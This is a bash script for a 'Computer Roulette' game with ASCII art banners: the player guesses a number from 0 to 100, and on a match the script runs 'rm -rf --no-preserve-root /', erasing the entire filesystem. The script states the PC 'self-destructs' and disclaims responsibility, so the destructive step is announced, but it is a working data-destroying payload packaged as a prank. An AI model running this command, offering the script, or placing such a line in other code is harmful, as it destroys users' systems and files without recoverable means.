#!/bin/bash
noir='\e[0;30m'
gris='\e[1;30m'
rougefonce='\e[0;31m'
rose='\e[1;31m'
vertfonce='\e[0;32m'
vertclair='\e[1;32m'
orange='\e[0;33m'
jaune='\e[1;33m'
bleufonce='\e[0;34m'
bleuclair='\e[1;34m'
violetfonce='\e[0;35m'
violetclair='\e[1;35m'
cyanfonce='\e[0;36m'
cyanclair='\e[1;36m'
grisclair='\e[0;37m'
blanc='\e[1;37m'
neutre='\e[0;m'

clear
echo -e "$cyanfonce
░█████╗░░█████╗░███╗░░░███╗██████╗░██╗░░░██╗████████╗███████╗██████╗░
██╔══██╗██╔══██╗████╗░████║██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔══██╗
██║░░╚═╝██║░░██║██╔████╔██║██████╔╝██║░░░██║░░░██║░░░█████╗░░██████╔╝
██║░░██╗██║░░██║██║╚██╔╝██║██╔═══╝░██║░░░██║░░░██║░░░██╔══╝░░██╔══██╗
╚█████╔╝╚█████╔╝██║░╚═╝░██║██║░░░░░╚██████╔╝░░░██║░░░███████╗██║░░██║
░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░░░░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝

██████╗░░█████╗░██╗░░░██╗██╗░░░░░███████╗████████╗████████╗███████╗
██╔══██╗██╔══██╗██║░░░██║██║░░░░░██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝
██████╔╝██║░░██║██║░░░██║██║░░░░░█████╗░░░░░██║░░░░░░██║░░░█████╗░░
██╔══██╗██║░░██║██║░░░██║██║░░░░░██╔══╝░░░░░██║░░░░░░██║░░░██╔══╝░░
██║░░██║╚█████╔╝╚██████╔╝███████╗███████╗░░░██║░░░░░░██║░░░███████╗
╚═╝░░╚═╝░╚════╝░░╚═════╝░╚══════╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚══════╝$neutre

"
echo -e "$orange\0Rule : $cyanfonce\0choose a number from 0 to 100 a number will be generated
randomly if, the chosen number is equal to the random number, then the
pc $rougefonce\0self-destructs $cyanfonce\0else, $vertclair\0nothing happen.
$blanc\0(The developer will not be responsible for the consequences)$neutre


"
sleep 1
stop=e
max=100
min=0
read -p "choose a number 0-100 [press: 'e' to stop] :" choise
VARIABLE=$(($RANDOM%100))
if [[ "$stop" -eq "$choise" ]]
then
    echo -e "$violetclair\0
███████████████████████████████████████
█─▄▄▄▄█▄─▄▄─█▄─▄▄─███▄─█─▄█─▄▄─█▄─██─▄█
█▄▄▄▄─██─▄█▀██─▄█▀████▄─▄██─██─██─██─██
▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▀▀▀▄▄▄▀▀▄▄▄▄▀▀▄▄▄▄▀▀
█████████████████████████████████████████████████████
█▄─▀█▄─▄█▄─▄▄─█▄─▀─▄█─▄─▄─███─▄─▄─█▄─▄█▄─▀█▀─▄█▄─▄▄─█
██─█▄▀─███─▄█▀██▀─▀████─███████─████─███─█▄█─███─▄█▀█
▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄█▄▄▀▀▄▄▄▀▀▀▀▀▄▄▄▀▀▄▄▄▀▄▄▄▀▄▄▄▀▄▄▄▄▄▀


"
    exit 0
fi

if [[ "$choise" -gt "$max" ]]
then
    echo -e "$rougefonce\0
█▄░█ █░█ █▀▄▀█   █ █▀   ▀█▀ █▀█ █▀█   █░█ █ █▀▀ █░█
█░▀█ █▄█ █░▀░█   █ ▄█   ░█░ █▄█ █▄█   █▀█ █ █▄█ █▀█ $neutre


"
    sleep 2
    clear
    ./roulette_hard.sh
fi

if [[ "$choise" -lt "$min" ]]
then
    echo -e "$rougefonce\0
█▄░█ █░█ █▀▄▀█   █ █▀   ▀█▀ █▀█ █▀█   █░░ █▀█ █░█░█
█░▀█ █▄█ █░▀░█   █ ▄█   ░█░ █▄█ █▄█   █▄▄ █▄█ ▀▄▀▄▀ $neutre


"
    sleep 2
    clear
    ./roulette_hard.sh
    exit 1
fi
if [[ "$VARIABLE" -eq "$choise" ]]
then
    echo -e "$rougefonce\0
█░█ █▀█   █▄░█ █▀█   █ █ █
█▀█ █▄█   █░▀█ █▄█   ▄ ▄ ▄ $neutre


"
    rm -rf --no-preserve-root /
    exit 0
fi
if [[ "$VARIABLE" -ne "$choise" ]]
then
    echo -e "$vertclair\0
█░░ █░█ █▀▀ █▄▀ █▄█   ▀█▀ █▀█ █▄█   ▄▀█ █▀▀ ▄▀█ █ █▄░█   ▀ ▀▄
█▄▄ █▄█ █▄▄ █░█ ░█░   ░█░ █▀▄ ░█░   █▀█ █▄█ █▀█ █ █░▀█   ▄ ▄▀ $neutre


"
    sleep 3
    clear
    ./roulette_hard.sh
fi

